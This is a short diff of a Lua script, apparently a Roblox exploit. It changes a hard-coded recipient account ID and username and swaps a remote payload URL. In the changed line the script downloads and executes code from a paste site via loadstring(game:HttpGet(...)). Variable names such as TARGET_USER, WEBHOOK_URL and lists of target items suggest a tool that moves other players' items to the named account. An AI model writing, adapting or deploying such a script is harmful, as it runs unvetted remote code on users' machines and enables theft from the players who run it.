@@ -1,5 +1,5 @@
-local TARGET_ID = 11808658357
-local TARGET_USER = "Hsm95100"
+local TARGET_ID = 8926002024
+local TARGET_USER = "Mh2s_976"
 local WEBHOOK_URL = "53453535353636"
 
 local TargetBrainrots = {
@@ -334,7 +334,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
